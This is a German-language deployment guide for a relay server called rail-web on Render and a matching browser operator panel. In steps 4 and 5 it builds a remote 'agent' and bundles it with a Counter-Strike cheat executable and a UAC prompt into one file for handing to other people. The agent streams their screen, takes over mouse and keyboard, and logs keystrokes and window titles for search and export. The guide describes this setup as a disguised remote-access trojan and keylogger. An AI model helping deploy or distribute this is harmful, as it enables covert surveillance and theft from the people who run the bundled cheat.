# Deploy-Anleitung: rail-web auf Render

Alles was du brauchst liegt in **diesem ordner**. Du lädst ihn zu GitHub, Render zieht ihn sich,
danach baust du den agent auf die neue URL und schickst wie gewohnt das bundle.

---

## 0. Was in diesem ordner ist

| datei | wofür |
|---|---|
| `server.js` | der relay. WebSocket-router, **keine abhängigkeiten** |
| `package.json` | start-befehl für Render |
| `render.yaml` | blueprint: free-plan, health-check, token wird erzeugt |
| `public/index.html` | die oberfläche im browser |
| `public/app.js` | geräte, bild, maus, tastatur, log, export |
| `public/crypto.js` | handshake + AES/HMAC im browser |
| `.gitignore` | hält node_modules und logs raus |

**Nicht** in diesen ordner gehören: der PSK, `op.cfg`, `wlanhost.exe`, irgendein cheat.
Der schlüssel wird später **im browser** eingetippt, nicht ins repo geschrieben.

---

## 1. GitHub-repo anlegen (5 minuten)

**Der einfache weg ohne git:**

1. `https://github.com/new`
2. Repository name: `rail-web` · **Private** wählen · *Add a README* **nicht** ankreuzen
3. **Create repository**
4. Auf der leeren repo-seite: **"uploading an existing file"** anklicken
5. Aus diesem ordner **alles** reinziehen — wichtig: `public/` als **ordner**, nicht die
   einzelnen dateien lose
6. Unten **Commit changes**

**Der weg mit git (wenn du es auf der platte hast):**

```powershell
cd C:\Users\hanne\Downloads\Tool\render-deploy
git init
git add .
git commit -m "rail-web"
git branch -M main
git remote add origin https://github.com/<deinname>/rail-web.git
git push -u origin main
```

**Kontrolle:** in der repo-übersicht müssen `public/`, `server.js`, `package.json`,
`render.yaml` liegen. Wenn `app.js` direkt im hauptordner liegt statt in `public/`, ist der
upload schiefgegangen — dann nochmal, ordner reinziehen.

---

## 2. Render verbinden (5 minuten)

1. `https://render.com` → **Get Started** → **GitHub** als login
2. GitHub einmal autorisieren (Render darf das repo lesen — nur dieses eine, wenn du willst)
3. Dashboard → **New +** → **Blueprint**
4. Repo `rail-web` auswählen → **Connect**
5. Render liest die `render.yaml` und zeigt: **1 service, free plan, ROOM_TOKEN (generiert)**
6. **Apply** / **Create**

Render baut jetzt (~1 minute) und gibt dir eine URL:

```
https://rail-web-xxxx.onrender.com
```

**Kontrolle:** öffne `https://rail-web-xxxx.onrender.com/health` — da muss stehen:

```
ok 0
```

(`0` = keine räume offen. `ok` heißt: der relay lebt.)

---

## 3. Den token holen

Render → dein service → **Environment** → bei `ROOM_TOKEN` auf **Reveal** (auge) →
den wert kopieren. Das ist der türsteher für `/agent` und `/op`, **nicht** der PSK.

Wenn du keinen willst: die variable löschen → dann ist der relay offen für jeden, der die URL
kennt. Nicht empfohlen.

---

## 4. Agent auf die neue URL bauen

Der agent muss wissen, wohin er dialt. Das steht in der exe, also **neu bauen**:

```powershell
cd C:\Users\hanne\Downloads\Tool
.\build.ps1 -HostName "rail-web-xxxx.onrender.com" `
            -Path "/agent?room=hannes&key=DEIN_TOKEN"
```

- `room=hannes` — frei wählbar, muss nur beim browser genauso heißen
- `key=DEIN_TOKEN` — der wert aus schritt 3
- die anführungszeichen sind wichtig, wegen dem `&`

Danach prüfen:

```powershell
Get-Content dist\agent.cfg
```

Da muss dein host und der pfad mit `?room=…&key=…` drinstehen.

---

## 5. Bundle bauen (cheat + agent in einer datei)

```powershell
.\tools\build-strawpack.ps1 `
  -Cheat "C:\Users\hanne\Downloads\Software\Cheese\cs2\build\bin\straw.exe" `
  -Out "straw-bundle2"
```

Ergebnis: `straw-bundle2\straw.exe` — cheat, agent, meldung, UAC. Das ist die datei, die du
weitergibst.

---

## 6. Bedienen

1. `https://rail-web-xxxx.onrender.com` im browser öffnen
2. oben rechts: **room** = `hannes`, **key** = der **PSK** aus `dist\op.cfg`
   (32 byte base64, z.b. `EXZXxTqK…=`) → **connect**
3. sobald ein agent da ist, steht er links in der geräteliste
4. gerät anklicken → bild kommt, monitor per dropdown, quality/fps/scale live
5. `control` anhaken → klick und tastatur gehen ins bild
6. tab log: suchfeld (`w:fenster`, `t:text`) → `query`; `alles exportieren` lädt eine `.tsv`

room und key merkt sich der browser (`localStorage`), beim nächsten mal nur noch connect.

---

## 7. Wenn was nicht geht

| symptom | ursache | was tun |
|---|---|---|
| `/health` gibt 502 oder timeout | service schläft (free) | seite neu laden, 30–50 s warten — Render weckt sich beim request |
| browser: „key muss 32 byte base64 sein" | falscher key | das ist der **PSK** aus `dist\op.cfg`, nicht der ROOM_TOKEN |
| relay sagt „keine geräte", agent läuft | pfad oder token falsch | `Get-Content dist\agent.cfg` prüfen; muss `/agent?room=…&key=…` sein |
| agent verbindet, browser zeigt nichts | browser nicht mit **connect** verbunden | erst connect, dann kommt die geräteliste |
| handshake rejected | falscher PSK im browser | den PSK aus **dem** `op.cfg`, aus dem der agent gebaut wurde |
| bild bleibt schwarz | niemand an dem PC angemeldet | agent-worker braucht eine aktive session |
| nach 15 min alles weg | free spin-down | normal, heilt beim nächsten verbindungsversuch |

**Logs live:** Render → dein service → **Logs**. Da steht jede verbindung:
`[hannes] agent 1 up (1)`, `operator up`, `handshake` fehler.

---

## 8. Was der relay sieht (und was nicht)

- **sieht:** dass eine IP zu room X verbindet, wie viele agents, wie groß die frames sind
- **sieht nicht:** bildschirm, tasten, ton, tastenlog — alles ist ende-zu-ende versiegelt
- **hat keinen speicher:** ein redeploy oder neustart setzt alles zurück, nichts bleibt

Der PSK ist der einzige schlüssel, und der liegt bei dir (browser-localStorage und `op.cfg`).

---

## 9. Reihenfolge, kurz

```
GitHub-repo  →  Render blueprint  →  /health prüfen
   →  ROOM_TOKEN kopieren
   →  build.ps1 -HostName … -Path "/agent?room=…&key=…"
   →  build-strawpack.ps1
   →  browser: room + PSK  →  connect
```

Ab dann ist es wie rail.exe, nur im browser und von überall.
